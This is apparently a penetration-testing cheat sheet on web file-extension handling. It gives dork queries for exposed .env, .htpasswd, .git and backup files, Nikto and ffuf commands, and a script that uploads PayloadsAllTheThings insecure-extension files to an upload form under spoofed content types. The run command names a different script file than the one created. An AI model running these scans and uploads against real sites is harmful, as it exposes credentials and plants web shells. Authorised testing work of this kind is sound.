# File Extensions Handling

## Check List

* [ ] Ensure that defaults and known files have been removed.
* [ ] Dirbust sensitive file extensions, or extensions that might contain raw data (e.g. scripts, raw data, credentials, etc.).
* [ ] Validate that no system framework bypasses exist on the rules set.

## Cheat Sheet

### Methodology

{% stepper %}
{% step %}
We open our browser and use the following command, which will find all sensitive files on the site, by entering the URL plus the target domain name
{% endstep %}

{% step %}
And then we can use the following commands to check for the presence of sensitive files such as <sub>XLS, PDF, CONF</sub>, etc. on the target
{% endstep %}

{% step %}
Using the following commands, we will check for file Uploader and scan different file types on the site using its own tool
{% endstep %}

{% step %}
We can create and run a script that does all this without errors, and if there is a sensitive file in the target, the vulnerability will be identified


{% endstep %}
{% endstepper %}

***

### Forced Browsing <a href="#forced-browsing" id="forced-browsing"></a>

#### [Google](https://www.exploit-db.com/google-hacking-database)

{% hint style="info" %}
Extensions
{% endhint %}

```bash
ext:log | 
ext:txt | 
ext:conf | 
ext:cnf | 
ext:ini | 
ext:env | 
ext:sh | 
ext:bak | 
ext:backup | 
ext:swp | 
ext:old | 
ext:~ | 
ext:git | 
ext:svn | 
ext:htpasswd | 
ext:htaccess | 
ext:json | 
ext:daf 
site:$WEBSITE
```

{% hint style="info" %}
OR
{% endhint %}

```bash
site:*.$WEBSITE (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

{% hint style="info" %}
File Types
{% endhint %}

```bash
filetype:pdf |
filetype:csv |
filetype:xls |
filetype:xlsx |
filetype:docx
site:$WEBSITE
```

#### [Nikto](https://github.com/sullo/nikto)

{% hint style="info" %}
Scan all
{% endhint %}

```bash
nikto -h $WEBSITE -ssl
```

#### [Eyewitness](https://github.com/RedSiege/EyeWitness)

{% hint style="info" %}
File Types
{% endhint %}

```bash
eyewitness --single $WEBSITE --web
```

#### [Katana](https://github.com/projectdiscovery/katana) & [FFUF](https://github.com/ffuf/ffuf)

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano ext-fuzzer.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <WEBSITE>"
    exit 1
fi

WEBSITE="$1"

# Create temporary files
KATANA_OUTPUT=$(mktemp)
URLS_FILE=$(mktemp)
COOKIE_FILE=$(mktemp)
PAYLOAD_FILE=$(mktemp)

# Run katana to gather URLs
katana -u "$WEBSITE" \
       -fr "(static|assets|img|images|css|fonts|icons)/" \
       -o "$KATANA_OUTPUT" \
       -xhr-extraction \
       -automatic-form-fill \
       -silent \
       -strategy breadth-first \
       -js-crawl \
       -extension-filter jpg,jpeg,png,gif,bmp,tiff,tif,webp,svg,ico,css \
       -headless --no-sandbox \
       -known-files all \
       -field url \
       -sf url

# Filter and clean extracted URLs
sed -E 's/\?.*//; s/\.aspx$//; s/\/[^/]+\.json$//' "$KATANA_OUTPUT" | grep -Ev '\.js$|&amp' | sort -u > "$URLS_FILE"

# User-Agent for requests
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0"
HEADERS=(
    "User-Agent: $USER_AGENT"
    "Accept: */*"
    "Accept-Language: en-US,fa-IR;q=0.5"
    "Accept-Encoding: gzip, deflate, br, zstd"
    "Connection: keep-alive"
    "Upgrade-Insecure-Requests: 1"
    "Sec-Fetch-Dest: script"
    "Sec-Fetch-Mode: no-cors"
    "Sec-Fetch-Site: cross-site"
    "DNT: 1"
    "Sec-GPC: 1"
    "Priority: u=0, i"
    "Te: trailers"
)

# Extract cookies from response headers
curl -s -I "$WEBSITE" | awk 'BEGIN {IGNORECASE=1} /^set-cookie:/ {print substr($0, 13)}' > "$COOKIE_FILE"

# Process cookies
COOKIES=$(awk -F';' '{print $1}' "$COOKIE_FILE" | tr '\n' '; ' | sed 's/; $//')

# Append cookies to headers if available
if [[ -n "$COOKIES" ]]; then
    HEADERS+=("Cookie: $COOKIES")
fi

# Convert headers into ffuf parameters
HEADER_PARAMS=()
for HEADER in "${HEADERS[@]}"; do
    HEADER_PARAMS+=("-H" "$HEADER")
done

# Run ffuf with optimized settings
ffuf -w "$URLS_FILE":URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -e log,txt,conf,cnf,ini,env,sh,bak,backup,swp,old,~,git,svn,htpasswd,htaccess,json,daf \
     -u URL/DIR \
     -ac -r -c -mc 200,403 \
     "${HEADER_PARAMS[@]}"

# Clean up temporary files
rm -f "$KATANA_OUTPUT" "$URLS_FILE" "$COOKIE_FILE" "$PAYLOAD_FILE"
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x ext-smart-fuzzer.sh;sudo ./ext-smart-fuzzer.sh $WEBSITE
```

### File Upload <a href="#file-upload" id="file-upload"></a>

#### [Fuxploider](https://github.com/almandin/fuxploider)

{% hint style="info" %}
Fuzz Uploader
{% endhint %}

```bash
fuxploider -u $WEBSITE --form-action /upload
```

#### [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

{% hint style="info" %}
Fuzz Extension & Content-Type
{% endhint %}

{% hint style="info" %}
Create Script
{% endhint %}

```bash
sudo nano fuzz-uploader.sh
```

```bash
#!/bin/bash

# Check if upload URL is provided
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 $WEBSITE/upload"
    exit 1
fi

# Read upload URL from command-line arguments
UPLOAD_URL="$1"
REPO_URL="https://github.com/swisskyrepo/PayloadsAllTheThings.git"
TARGET_FOLDER="/usr/share/PayloadsAllTheThings"

# Function to detect backend language based on HTTP response headers
detect_backend_language()
{
    RESPONSE=$(curl -s -I "$UPLOAD_URL")
    
    # Check for PHP by detecting "X-Powered-By: PHP"
    if echo "$RESPONSE" | grep -i "X-Powered-By: PHP" > /dev/null; then
        echo "php"
    # Check for ASP.NET by detecting "X-Powered-By: ASP.NET"
    elif echo "$RESPONSE" | grep -i "X-Powered-By: ASP.NET" > /dev/null; then
        echo "asp"
    # Check for HTML by detecting absence of PHP or ASP.NET
    elif echo "$RESPONSE" | grep -i "Content-Type: text/html" > /dev/null; then
        echo "html"
    else
        echo "unknown"
    fi
}

# Clone the repository if not already cloned
if [ ! -d "$TARGET_FOLDER" ]; then
    echo "Cloning repository to $TARGET_FOLDER ..."
    git clone --depth 1 "$REPO_URL" "$TARGET_FOLDER"
    if [ $? -ne 0 ]; then
        echo "Error: Failed to clone the repository."
        exit 1
    fi
else
    echo "Repository already exists at $TARGET_FOLDER. Pulling latest changes..."
    cd "$TARGET_FOLDER" && git pull --depth 1
    if [ $? -ne 0 ]; then
        echo "Error: Failed to update the repository."
        exit 1
    fi
fi

# Detect backend language
BACKEND_LANG=$(detect_backend_language)

# Set the folder containing the target files based on the backend language
case $BACKEND_LANG in
    "php")
        FOLDER="$TARGET_FOLDER/Upload Insecure Files/Extension PHP"
        ;;
    "asp")
        FOLDER="$TARGET_FOLDER/Upload Insecure Files/Extension ASP"
        ;;
    "html")
        FOLDER="$TARGET_FOLDER/Upload Insecure Files/Extension HTML"
        ;;
    *)
        echo "Unknown backend language or unable to detect."
        exit 1
        ;;
esac

# Check if the target folder exists
if [ ! -d "$FOLDER" ]; then
    echo "Error: Target folder $FOLDER does not exist."
    exit 1
fi

echo "Using folder: $FOLDER"

# List of content types to try
CONTENT_TYPES=(
    "application/x-php"
    "application/octet-stream"
    "image/gif"
    "image/png"
    "image/jpeg"
)

# Find all files in the folder
FILES=$(find "$FOLDER" -type f)

# Check if there are any files
if [ -z "$FILES" ]; then
    echo "No files found in the folder."
    exit 1
fi

# Upload each file with all content types
for FILE in $FILES; do
    FILENAME=$(basename "$FILE")
    echo "Testing file: $FILENAME with all content types..."

    for CONTENT_TYPE in "${CONTENT_TYPES[@]}"; do
        echo "Uploading with Content-Type: $CONTENT_TYPE ..."

        # Perform the upload using cURL
        RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -X POST \
            -H "Content-Type: $CONTENT_TYPE" \
            -F "file=@$FILE;type=$CONTENT_TYPE" \
            "$UPLOAD_URL")

        # Extract response body and HTTP status
        BODY=$(echo "$RESPONSE" | sed -n "1,/^HTTP_STATUS:/p" | sed "$d")
        HTTP_STATUS=$(echo "$RESPONSE" | sed -n "s/^HTTP_STATUS://p")

        # Check the HTTP status
        if [ "$HTTP_STATUS" -eq 200 ]; then
            echo "Upload successful with Content-Type: $CONTENT_TYPE"
            echo "Server response: $BODY"
            break # Stop testing other Content-Types for this file
        else
            echo "Failed with Content-Type: $CONTENT_TYPE"
            echo "HTTP status: $HTTP_STATUS"
            echo "Server response: $BODY"
        fi
        echo "-----------------------------"
    done

    echo "Finished testing file: $FILENAME"
    echo "============================="
done

echo "All files have been tested with all content types."
```

{% hint style="info" %}
Run Script
{% endhint %}

```bash
sudo chmod +x fuzz-uploader.sh;sudo ./fuzz-uploader.sh $WEBSITE/upload
```
